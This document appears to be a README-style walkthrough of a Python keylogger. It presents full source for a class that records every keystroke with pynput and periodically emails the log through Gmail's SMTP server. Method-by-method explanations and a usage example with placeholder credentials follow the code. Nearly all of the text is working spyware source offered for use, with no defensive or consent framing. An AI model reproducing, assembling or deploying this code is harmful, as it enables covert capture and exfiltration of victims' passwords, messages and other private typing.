# keylogger
Importing Libraries

python

import smtplib
import pynput.keyboard
import threading

    smtplib: This module defines an SMTP client session object that can be used to send email.
    pynput.keyboard: This module allows monitoring and controlling keyboard input.
    threading: This module is used to run tasks in separate threads, enabling tasks to be performed concurrently.

Class: Keylogger

python

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started "
        self.interval = time_interval
        self.email = email
        self.password = password

    __init__(self, time_interval, email, password): Initializes the Keylogger object.
        self.log: A string to store the log of key presses.
        self.interval: Time interval (in seconds) for sending the log via email.
        self.email: The email address to send the log to.
        self.password: The password for the email account used to send the log.

Method: append_to_log(self, string)

python

def append_to_log(self, string):
    self.log = self.log + string

    Appends the provided string to the log.

Method: process_keypress(self, key)

python

def process_keypress(self, key):
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == key.space:
            current_key = " "
        else:
            current_key = " " + str(key) + " "
    self.append_to_log(current_key)

    process_keypress(self, key): Handles key press events.
        try: Attempts to get the character of the key pressed.
        except AttributeError: Handles special keys (like space, enter, etc.).
        Appends the pressed key to the log.

Method: send_mail(self, email, password, message)

python

def send_mail(self, email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

    send_mail(self, email, password, message): Sends an email with the log.
        Connects to Gmail's SMTP server.
        Starts TLS encryption.
        Logs in to the email account.
        Sends the email with the logged keystrokes.
        Closes the connection to the SMTP server.

Method: report(self)

python

def report(self):
    self.send_mail(self.email, self.password, "\n\n" + self.log)
    self.log = " "
    timer = threading.Timer(self.interval, self.report)
    timer.start()

    report(self): Sends the log via email at regular intervals.
        Sends the email with the current log.
        Clears the log.
        Sets a timer to call itself again after the specified interval.

Method: start(self)

python

def start(self):
    keyword_listener = pynput.keyboard.Listener(on_press=self.process_keypress)
    with keyword_listener:
        self.report()
        keyword_listener.join()

    start(self): Starts the keylogger.
        pynput.keyboard.Listener(on_press=self.process_keypress): Sets up a keyboard listener that calls process_keypress on key press events.
        with keyword_listener: Starts the listener.
        self.report(): Initiates the first report call.
        keyword_listener.join(): Waits for the listener to finish (runs indefinitely).

Summary

This script defines a Keylogger class that captures keystrokes and sends them via email at regular intervals. Here's how it works:

    Initialization: The keylogger is initialized with a time interval, email address, and password.
    Key Press Handling: Each key press is logged, handling both regular and special keys.
    Email Sending: Periodically sends the logged keys to the specified email address.
    Starting the Keylogger: Begins capturing keystrokes and starts the periodic reporting.

Usage

To use this keylogger:

    Create an instance of Keylogger with the desired time interval, email, and password.
    Call the start method on the instance to begin logging keystrokes and sending emails.

Example Usage

python

my_keylogger = Keylogger(120, "your_email@gmail.com", "your_password")
my_keylogger.start()

    This example creates a keylogger that sends the log every 120 seconds to "your_email@gmail.com" using "your_password".
